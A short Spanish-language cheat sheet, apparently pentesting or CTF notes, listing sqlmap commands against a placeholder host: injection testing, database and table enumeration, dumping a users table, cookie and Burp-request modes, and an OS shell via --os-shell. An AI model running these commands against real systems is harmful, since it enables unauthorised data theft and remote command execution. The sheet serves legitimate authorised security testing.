# SQL injection (sqlmap)

## Desde una URL (GET)
sqlmap -u "http://$T/page.php?id=1" --batch
sqlmap -u "http://$T/page.php?id=1" --batch --dbs          # listar bases
sqlmap -u "http://$T/page.php?id=1" --batch -D basedatos --tables
sqlmap -u "http://$T/page.php?id=1" --batch -D basedatos -T usuarios --dump

## POST / con cookie de sesión
sqlmap -u "http://$T/login" --data "user=a&pass=b" --batch
sqlmap -u "http://$T/panel" --cookie "PHPSESSID=..." --batch

## Desde una petición guardada de Burp
sqlmap -r peticion.txt --batch --level 3 --risk 2

## Shell si el SGBD lo permite
sqlmap -u "http://$T/page.php?id=1" --batch --os-shell
